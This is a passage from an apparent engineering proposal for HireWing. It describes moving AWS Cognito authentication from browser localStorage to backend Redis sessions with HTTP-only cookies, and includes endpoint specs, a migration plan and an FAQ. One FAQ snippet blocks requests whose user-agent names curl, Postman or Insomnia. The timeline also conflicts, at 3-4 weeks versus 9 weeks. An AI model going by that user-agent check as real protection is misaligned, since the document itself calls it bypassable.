2. ✅ Look up session in Redis: `GET session:abc123def456`
3. ✅ Validate session not expired
4. ✅ Check user account still active in database
5. ✅ Return user details from session

**What This Replaces:**
- New endpoint (no direct replacement, but simplifies page refresh logic)

---

#### **4. POST /api/auth/change-password**

**Purpose:** Change user password via AWS Cognito (backend handles tokens)

**Request Payload:**
```json
{
  "currentPassword": "OldPassword123!",
  "newPassword": "NewSecurePass456!"
}
```

**Request Headers:**
```
Cookie: session=abc123def456...
```

**Success Response (200 OK):**
```json
{
  "success": true,
  "message": "Password changed successfully"
}
```

**Error Responses:**
```javascript
// 400 Bad Request
{
  "success": false,
  "error": "Current password is incorrect"
}

// 400 Bad Request
{
  "success": false,
  "error": "New password does not meet requirements"
}
```

**Backend Processing:**
1. ✅ Extract session ID from cookie
2. ✅ Get AWS Cognito tokens from Redis session
3. ✅ Call AWS Cognito `ChangePasswordCommand` with current and new password
4. ✅ AWS Cognito validates current password and updates to new password
5. ✅ Return success response

**What This Replaces:**
- Old `/api/auth/changePassword` (frontend no longer needs Cognito tokens)

---

### Summary: API Changes

| Aspect | Current Architecture | New Secure Architecture |
|--------|---------------------|-------------------------|
| **Login API Calls** | 5 separate requests (AWS Cognito + 4 backend calls) | 1 request (80% reduction) |
| **Authentication** | Frontend handles AWS Cognito directly | Backend handles AWS Cognito |
| **Token Storage** | localStorage: `accessToken`, `idToken`, `refreshToken`, `bearer_token` (XSS vulnerable) | Redis on backend (secure) |
| **Session Management** | Bearer token in localStorage | HTTP-only cookie with session ID |
| **User Data Fetching** | 4 separate API calls after Cognito | 1 combined response with all data |
| **Page Refresh** | Re-fetch all data manually (5 calls) | 1 API call to `/api/auth/me` |
| **Password Change** | Frontend needs Cognito tokens | Backend handles via session |
| **Logout** | Only clears backend session | Clears Redis + AWS Cognito + Cookie |
| **Theme Settings** | Fetched via `/mgmt/customers/atsux` (separate call) | Included in login response |
| **Custom Messages** | Fetched via `/mgmt/customers/atsux/custommessages` (separate call) | Included in login response |

**Benefits:**
- ✅ **80% fewer API calls** on login (5 → 1)
- ✅ **Better security** - HTTP-only cookies, no tokens on frontend, XSS protection
- ✅ **Simpler frontend** - no AWS Cognito SDK (`amazon-cognito-identity-js`) needed
- ✅ **Better UX** - faster login (one network round-trip vs five), smoother experience
- ✅ **Centralized session management** - easy to invalidate sessions, track active users
- ✅ **Audit trail** - all auth actions logged on backend
- ✅ **Easier debugging** - all auth logic in one place (backend)

---

### Example: Using Sessions with Other API Endpoints

Once authentication is complete, all other API requests automatically use the session cookie for authentication.

#### **Example 1: GET /api/applicants**

**Purpose:** Fetch list of applicants

**Request:**
```http
GET /api/applicants HTTP/1.1
Host: api.hirewing.ca
Cookie: session=abc123def456...
```

**Middleware Chain:**
1. `validateSession` - Validates session cookie and extracts user info
2. `checkPermissions` - Verifies user has "view applicants" permission

**Success Response (200 OK):**
```json
{
  "success": true,
  "data": [
    { "id": 1, "name": "John Smith", "email": "john@example.com", ... },
    { "id": 2, "name": "Jane Doe", "email": "jane@example.com", ... }
  ]
}
```

**Error Responses:**
```json
// 401 Unauthorized - Session invalid/expired
{
  "success": false,
  "error": "Not authenticated"
}

// 403 Forbidden - User lacks permission
{
  "success": false,
  "error": "No permission to view applicants"
}
```

---

#### **Example 2: POST /api/applicants**

**Purpose:** Create new applicant

**Request:**
```http
POST /api/applicants HTTP/1.1
Host: api.hirewing.ca
Cookie: session=abc123def456...
Content-Type: application/json

{
  "name": "Jane Smith",
  "email": "jane@example.com",
  "phone": "+1234567890",
  "resume": "base64_encoded_file..."
}
```

**Middleware Chain:**
1. `csrfProtection` - Validates CSRF token (optional, if implementing CSRF protection)
2. `validateSession` - Validates session cookie
3. `checkPermissions` - Verifies user has "create applicants" permission

**Success Response (201 Created):**
```json
{
  "success": true,
  "data": {
    "id": 456,
    "name": "Jane Smith",
    "email": "jane@example.com",
    "createdAt": "2025-11-09T10:30:00Z"
  }
}
```

**Error Responses:**
```json
// 400 Bad Request - Invalid data
{
  "success": false,
  "error": "Email already exists"
}

// 401 Unauthorized
{
  "success": false,
  "error": "Not authenticated"
}

// 403 Forbidden
{
  "success": false,
  "error": "No permission to create applicants"
}
```

---

## 6. Backend Implementation

### A. Project Structure

```
backend/
├── src/
│   ├── config/
│   │   ├── cognito.js        # AWS Cognito configuration
│   │   ├── redis.js          # Redis connection
│   │   └── cors.js           # CORS settings
│   │
│   ├── middleware/
│   │   ├── validateSession.js   # Session validation middleware
│   │   ├── rateLimit.js         # Rate limiting
│   │   ├── csrf.js              # CSRF protection
│   │   └── permissions.js       # Role-based permissions
│   │
│   ├── services/
│   │   ├── cognitoService.js    # AWS Cognito operations
│   │   ├── sessionService.js    # Session management
│   │   └── userService.js       # User database operations
│   │
│   ├── routes/
│   │   ├── auth.js              # Authentication routes
│   │   ├── applicants.js        # Applicants routes
│   │   └── jobs.js              # Job postings routes
│   │
│   ├── controllers/
│   │   ├── authController.js    # Auth logic
│   │   ├── applicantsController.js
│   │   └── jobsController.js
│   │
│   └── app.js                   # Express app setup
│
├── .env                         # Environment variables
└── package.json
```

---

## 7. Next Steps

### What Needs to Be Built

This proposal outlines the **technical discussion** for implementing secure authentication. The actual implementation will require:

1. **Backend Development:**
   - Set up Node.js/Express backend server
   - Install required packages (@aws-sdk/client-cognito-identity-provider, redis, express, cookie-parser, etc.)
   - Implement AWS Cognito service wrapper
   - Create session management with Redis
   - Build authentication controller and routes
   - Add session validation middleware

2. **Frontend Updates:**
   - Remove AWS Cognito SDK (amazon-cognito-identity-js) from frontend
   - Update login flow to call new `/api/auth/login` endpoint
   - Replace localStorage token management with cookie-based sessions
   - Update API interceptor to work with cookies instead of Authorization headers
   - Implement new `/api/auth/me` call for page refresh

3. **Testing & Migration:**
   - Test authentication flow end-to-end
   - Validate session management and token refresh
   - Test security features (XSS protection, CSRF, rate limiting)
   - Plan phased rollout to production

### Implementation Timeline

**Estimated Timeline:** 3-4 weeks

- **Week 1-2:** Backend setup (Cognito service, Redis, authentication routes)
- **Week 2-3:** Frontend integration (remove Cognito SDK, update login flow)
- **Week 3-4:** Testing, security validation, and deployment

---

## 8. Key Takeaways

### Current Issues

❌ **Security Vulnerabilities:**
- AWS tokens stored in localStorage (XSS vulnerable)
- Bearer token exposed to JavaScript
- No HTTP-only cookie protection

❌ **Performance Problems:**
- 5 separate API calls on every login
- Slow user experience (multiple network round-trips)

❌ **Maintenance Complexity:**
- Frontend handles AWS Cognito directly
- Authentication logic scattered across multiple files
- Difficult to debug authentication issues

### Proposed Solution Benefits

✅ **Enhanced Security:**
- HTTP-only cookies (XSS protection)
- All AWS tokens stored on backend only
- CSRF protection with SameSite cookies
- Centralized session management

✅ **Better Performance:**
- 80% reduction in API calls (5 → 1)
- Faster login experience
- Single network round-trip

✅ **Simplified Architecture:**
- Backend handles all AWS Cognito operations
- Frontend only needs to call `/api/auth/login`
- Easier to maintain and debug
- Clear separation of concerns

---

## 9. Migration Strategy

### Overview

This section outlines a **phased approach** to migrate from the current authentication system to the new secure architecture with **zero downtime**.

---

### Phase 1: Backend Setup (Week 1-2)

**Tasks:**
1. ✅ Set up Node.js backend with Express
2. ✅ Install dependencies:
   ```bash
   npm install @aws-sdk/client-cognito-identity-provider
   npm install redis ioredis
   npm install express cookie-parser cors
   npm install csurf express-rate-limit
   npm install helmet dotenv
   ```
3. ✅ Configure AWS Cognito SDK on backend
4. ✅ Set up Redis for session storage
5. ✅ Implement session service
6. ✅ Implement Cognito service
7. ✅ Create authentication endpoints
8. ✅ Set up CORS, CSRF, rate limiting
9. ✅ Test backend authentication flow

---

### Phase 2: Dual Support (Week 3-4)

**Strategy:** Support BOTH old and new authentication simultaneously

**Tasks:**
1. ✅ Deploy backend with new authentication endpoints
2. ✅ Keep existing frontend Cognito authentication working
3. ✅ Create feature flag to toggle between old and new auth
4. ✅ Test new authentication in staging environment
5. ✅ Create migration script for existing users

---

### Phase 3: Frontend Migration (Week 5-6)

**Tasks:**
1. ✅ Remove AWS Cognito SDK from frontend
2. ✅ Update login component to use backend API
3. ✅ Update AuthGuard to use session validation
4. ✅ Update all API calls to use cookies instead of tokens
5. ✅ Remove encryption utilities (no longer needed)
6. ✅ Remove CognitoSlice.js
7. ✅ Test all authentication flows
8. ✅ Test session persistence, logout, password change

---

### Phase 4: Testing & Deployment (Week 7-8)

**Testing Checklist:**
- ✅ Login with valid credentials
- ✅ Login with invalid credentials
- ✅ Remember me functionality
- ✅ Session persistence on page refresh
- ✅ Session persistence across tabs
- ✅ Session expiration (24 hours / 30 days)
- ✅ Automatic token refresh
- ✅ Logout
- ✅ Password change
- ✅ Account disabled scenario
- ✅ CORS protection
- ✅ CSRF protection
- ✅ Rate limiting
- ✅ XSS attack prevention
- ✅ Cookie security (HTTP-only, Secure, SameSite)
- ✅ Postman/curl blocking

**Deployment:**
1. Deploy to staging
2. Run comprehensive tests
3. Monitor for issues
4. Gradual rollout to production
5. Monitor error rates and performance
6. Full production deployment

---

### Phase 5: Cleanup (Week 9)

**Tasks:**
1. ✅ Remove old Cognito code from frontend
2. ✅ Remove feature flags
3. ✅ Update documentation
4. ✅ Archive old authentication code
5. ✅ Performance optimization
6. ✅ Security audit

---

## 10. FAQ & Justifications

### Q1: Session ID vs JWT - Which should we use?

**Recommendation: Session ID (Stateful)**

**Pros of Session ID:**
- ✅ Can invalidate sessions immediately (force logout)
- ✅ Can track active sessions
- ✅ Can see all user sessions
- ✅ Easier to implement session expiration
- ✅ No token size limitations
- ✅ Can update session data without re-issuing token

**Pros of JWT:**
- ✅ Stateless (no server-side storage needed)
- ✅ Contains all necessary information
- ✅ Works well with microservices

**Why Session ID is better for HireWing:**
1. We need to invalidate sessions when admin disables account
2. We want to see active sessions for security
3. We're already using Redis
4. We need to store AWS Cognito tokens anyway

**Implementation:** Use Session ID stored in HTTP-only cookie, with session data (including AWS tokens) in Redis.

---

### Q2: Why move authentication to backend?

**Security Benefits:**
1. **XSS Protection** - Tokens never exposed to JavaScript
2. **Credential Protection** - AWS config not in frontend code
3. **Centralized Control** - Can invalidate sessions from backend
4. **Token Refresh** - Automatic, transparent to frontend
5. **Attack Surface Reduction** - Less code exposed to public

**Maintenance Benefits:**
1. **Simpler Frontend** - No complex token management
2. **Easier Debugging** - All auth logic in one place
3. **Better Monitoring** - Track sessions, login attempts
4. **Compliance** - Easier to meet security standards

---

### Q3: How do we handle token refresh?

**Answer:** Completely transparent to frontend.

```javascript
// In validateSession middleware
if (isTokenExpired(session.accessToken)) {
  const newTokens = await cognitoService.refreshToken(session.refreshToken);
  await sessionService.updateSession(sessionId, {
    accessToken: newTokens.accessToken,
    idToken: newTokens.idToken
  });
}

// Request continues with fresh tokens
// Frontend never knows refresh happened
```

---

### Q4: What happens if Redis goes down?

**Answer:** Implement failover strategy.

**Option 1: Redis Cluster** (Recommended)
- Use Redis Cluster for high availability
- Automatic failover
- Data replication

**Option 2: Fallback to Database**
- Store sessions in PostgreSQL/MySQL as backup
- If Redis unavailable, use database
- Performance hit, but maintains availability

**Option 3: Redis Sentinel**
- Monitors Redis instance
- Automatic failover to replica
- High availability

---

### Q5: How do we block Postman/curl requests?

**Answer:** Multi-layer approach.

```javascript
// 1. Check Origin header
if (!req.get('origin') && process.env.NODE_ENV === 'production') {
  return res.status(403).json({ error: 'Forbidden' });
}

// 2. Check User-Agent
const userAgent = req.get('user-agent');
if (/postman|curl|insomnia/i.test(userAgent)) {
  return res.status(403).json({ error: 'Forbidden' });
}

// 3. CORS - Only allow specific domains
// 4. CSRF token required for state-changing requests
// 5. Rate limiting based on IP
```

**Note:** Determined attackers can bypass these, but it raises the bar significantly.

---

### Q6: Can we still use AWS Cognito with this approach?

**Yes!** We still use AWS Cognito for:
- User authentication
- Password management
- User attributes
- MFA (if implemented)

**Difference:** Backend calls Cognito, not frontend. Tokens stay on server.

---

### Q7: What about Remember Me with secure cookies?

**Answer:** Cookie maxAge controls session duration.

```javascript
// Remember Me checked
res.cookie('session', sessionId, {
  maxAge: 30 * 24 * 60 * 60 * 1000, // 30 days
  // ... other options
});

// Remember Me unchecked
res.cookie('session', sessionId, {
  maxAge: 24 * 60 * 60 * 1000, // 24 hours
  // ... other options
});
```

Session in Redis has matching TTL. Cookie and session expire together.

---

### Q8: Performance impact of session validation on every request?

**Answer:** Minimal with Redis.

**Redis Performance:**
- GET operation: < 1ms
- In-memory storage
- Can handle 100,000+ requests/second

**Optimization:**
- Use Redis pipelining for batch operations
- Cache session data in request object for multiple middleware
- Use Redis Cluster for horizontal scaling

**Alternative:** Add short-lived cache in Node.js memory (5-10 seconds) to reduce Redis calls for same session.

---

### Q9: How do we migrate existing users?

**Answer:** Seamless migration.

**Users don't need to do anything:**
1. Existing users log in with current credentials
2. Backend authenticates with Cognito (works same as before)
3. Backend creates new session and cookie
4. User continues normally

**Data Migration:**
- No database changes needed (userId remains same)
- Sessions created on first login with new system
- Old localStorage tokens ignored

---

### Q10: Security comparison - Current vs Proposed

| Security Aspect | Current (Frontend Auth) | Proposed (Backend Auth) |
|----------------|-------------------------|-------------------------|
| Token Exposure | ❌ Visible in localStorage | ✅ Hidden on server |
| XSS Protection | ❌ Vulnerable | ✅ Protected (HTTP-only cookies) |
| CSRF Protection | ❌ None | ✅ SameSite + CSRF tokens |
| Credential Exposure | ❌ AWS config in frontend | ✅ Config on server only |
| Session Control | ❌ Cannot invalidate | ✅ Can force logout |
| Token Theft | ❌ Possible via XSS | ✅ Very difficult |
| CORS Protection | ⚠️ Partial | ✅ Full |
| Rate Limiting | ❌ None | ✅ Implemented |
| Session Monitoring | ❌ Not possible | ✅ Full visibility |

---

## Summary for Management

### What We're Changing

**Moving from:**
- Frontend-based authentication (insecure)
- Tokens stored in browser localStorage
- AWS Cognito called directly from frontend

**Moving to:**
- Backend-based authentication (secure)
- Secure HTTP-only cookies
- AWS Cognito called from backend only
- Server-side session management

### Why We're Changing

**Security Improvements:**
1. Protection against XSS attacks (tokens not accessible to JavaScript)
2. Protection against CSRF attacks (SameSite cookies)
3. CORS protection (only trusted domains)
4. Centralized authentication control
5. Better compliance with security standards

**Business Benefits:**
1. Reduced risk of data breaches
2. Better user session monitoring
3. Ability to force logout compromised accounts
4. Easier security audits
5. Industry best practices

### Timeline: 9 weeks

- **Weeks 1-2:** Backend development
- **Weeks 3-4:** Dual support (old + new)
- **Weeks 5-6:** Frontend migration
- **Weeks 7-8:** Testing & deployment
- **Week 9:** Cleanup & documentation

### Risk Mitigation

- Dual support allows rollback
- Gradual deployment minimizes impact
- Comprehensive testing before production
- Session monitoring for issues
- No disruption to existing users

### Recommendation

**Proceed with backend authentication migration.**

This is a significant security improvement with minimal user impact. The investment in development time will pay off in:
- Reduced security risks
- Better compliance
- Easier maintenance
- Industry-standard architecture

---

**End of Proposal Document**
